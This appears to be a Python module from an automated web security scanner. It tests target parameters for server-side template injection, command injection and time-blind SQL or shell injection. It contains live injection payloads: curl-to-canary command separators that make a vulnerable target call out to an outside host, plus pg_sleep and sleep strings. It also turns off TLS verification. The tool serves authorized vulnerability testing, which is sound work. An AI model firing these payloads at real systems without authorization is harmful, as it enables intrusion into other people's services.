#!/usr/bin/env python3
"""
injection.py -- #5: injection-class vector (SSTI / cmdi-RCE / time-blind), backed by X's oracle forms.

Registered into vectors.LEGS as action "inject" (discovery-module pattern), seeded by planner.inject_seeds.
Gives the highest-severity injection classes a REAL deterministic gate (the old path fell to the weak shell
heuristic X killed). Three arms, each -> a deterministic oracle:
  * SSTI          -> SstiOracle: inject an arithmetic marker with DISTINCTIVE operands ({{a*b}}/${a*b}/#{a*b}/
                    <%=a*b%>) and confirm the PRODUCT appears (not the literal expr) => template evaluated.
  * cmdi / OOB    -> CanaryCallbackOracle: inject a benign `curl http://<canary>/<token>` command-separator
                    payload; a callback = the target executed our command (blind RCE proof). Non-destructive.
  * time-blind    -> TimingDifferentialOracle: baseline vs a sleep-payload; a robust median+MAD delay = blind
                    injection (sqli/cmdi) where nothing is reflected.
Non-destructive: SSTI is arithmetic; cmdi is a canary GET (no destructive command); time-blind is a sleep.
The non-destructive guard (test_suggestions.guard) still applies to any shell path. Gate AEGIS_INJECT=0.
"""
from __future__ import annotations
import json as _json
import os
import random
import time
import uuid

_ACTIVE_CMDI = str(os.environ.get("AEGIS_ACTIVE_CMDI", "1")).lower() not in ("0", "false", "no", "off")


def _sess(ctx):
    import requests as _rq
    try: _rq.packages.urllib3.disable_warnings()
    except Exception: pass
    sfr = (ctx or {}).get("session_for_role")
    return sfr((ctx or {}).get("role", "owner")) if sfr else (lambda s: (setattr(s, "verify", False) or s))(_rq.Session())


def _ssti_payloads():
    """Distinctive operands so the product can't occur naturally (two 4-5 digit primes)."""
    a, b = random.choice([(3181, 7919), (5003, 6151), (7127, 8087)])
    prod = str(a * b)
    exprs = [("{{%d*%d}}" % (a, b)), ("${%d*%d}" % (a, b)), ("#{%d*%d}" % (a, b)),
             ("<%%= %d*%d %%>" % (a, b)), ("{%d*%d}" % (a, b))]
    return prod, exprs


def inject(move, ctx):
    """#5 injection battery: SSTI (arithmetic marker) + cmdi (OOB canary) + time-blind (timing)."""
    if str(os.environ.get("AEGIS_INJECT", "1")).lower() in ("0", "false", "no", "off"):
        return {"status": 0, "body": "[inject] disabled", "inject": {"verdict": "rejected"}, "inject_verified": False}
    from verified_findings import SstiOracle, CanaryCallbackOracle, TimingDifferentialOracle
    base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    path = move.get("surface") or move.get("path") or "/"
    url = base.rstrip("/") + (path if str(path).startswith("/") else "/" + str(path))
    params = move.get("params") or ["q", "search", "name", "message", "note", "template", "subject",
                                    "title", "body", "filename", "callback", "input"]
    method = (move.get("method") or "GET").upper()
    if method not in ("GET", "POST"):
        return {"status": 0, "blocked": "inject restricted to GET/POST", "body": ""}
    s = _sess(ctx)
    out = {"surface": path, "results": {}}
    verified_any = False

    def _send(p, val):
        try:
            if method == "POST":
                r = s.post(url, json={p: val}, timeout=15, verify=False)
            else:
                r = s.get(url, params={p: val}, timeout=15, verify=False)
            return r, (r.text or "")[:4000]
        except Exception:
            return None, ""

    # 1) SSTI -- arithmetic marker
    prod, exprs = _ssti_payloads()
    for p in params[:int(move.get("param_cap", 8))]:
        for expr in exprs:
            r, body = _send(p, expr)
            if r is None:
                continue
            v, rc = SstiOracle(expr, prod, body, surface=path, param=p).check()
            if v == "verified":
                out["results"]["ssti"] = {"verdict": v, **rc}; verified_any = True
                return {"status": 200, "body": _json.dumps(out)[:2000], "inject": out, "inject_verified": True}

    # 2) cmdi / OOB canary (benign curl-to-canary via common separators) -- proves blind command execution
    if _ACTIVE_CMDI:
        try:
            import canary
            canary.start()
            for p in params[:int(move.get("param_cap", 8))]:
                tok = canary.token(); cu = canary.url_for(tok)
                for sep in (";curl %s", "|curl %s", "$(curl %s)", "`curl %s`", "&&curl %s"):
                    _send(p, "x" + (sep % cu))
                time.sleep(float(move.get("wait", 3)))
                h = canary.hits(tok)
                if h:
                    v, rc = CanaryCallbackOracle(tok, h, surface=path).check()
                    out["results"]["cmdi"] = {"verdict": v, "param": p, **rc}; verified_any = True
                    return {"status": 200, "body": _json.dumps(out)[:2000], "inject": out, "inject_verified": True}
        except Exception as e:
            out["results"]["cmdi"] = {"verdict": "inconclusive", "note": f"canary unavailable: {e}"}

    # 3) time-blind -- baseline latencies vs a sleep payload
    delay = int(move.get("delay", 5))
    sleep_payloads = move.get("sleep_payloads") or [f"1)) OR pg_sleep({delay})--", f";sleep {delay};", f"'||pg_sleep({delay})||'"]
    p0 = params[0]
    base_lat, test_lat = [], []
    for _ in range(int(move.get("timing_samples", 4))):
        r, _b = _send(p0, "aegis" + uuid.uuid4().hex[:6])
        if r is not None:
            base_lat.append(r.elapsed.total_seconds() * 1000.0)
    for sp in sleep_payloads:
        t0 = time.time(); r, _b = _send(p0, sp); dt = (time.time() - t0) * 1000.0
        if r is not None:
            test_lat.append(dt)
    if len(base_lat) >= 3 and len(test_lat) >= 3:
        v, rc = TimingDifferentialOracle(base_lat, test_lat, min_delta_ms=delay * 800.0,
                                         surface=path, oracle_id="timing@inject").check()
        out["results"]["time_blind"] = {"verdict": v, **rc}; verified_any |= (v == "verified")

    return {"status": 200, "body": _json.dumps(out)[:2000], "inject": out, "inject_verified": verified_any}


LEGS = {"inject": inject}
